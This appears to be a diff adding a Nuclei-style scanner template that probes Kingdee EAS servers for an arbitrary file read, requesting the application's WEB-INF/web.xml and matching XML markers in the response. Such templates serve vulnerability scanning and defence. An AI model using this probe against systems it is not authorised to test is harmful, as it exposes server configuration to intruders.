@@ -1,0 +1,24 @@
+id: poc-yaml-kingdee-eas-extweb-anyfile-read
+info:
+  name: Kingdee EAS extweb Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: info
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/easWebClient/deploy/client/ctrlhome/webapps/extweb/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "web-app"
+          - "<servlet-class>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
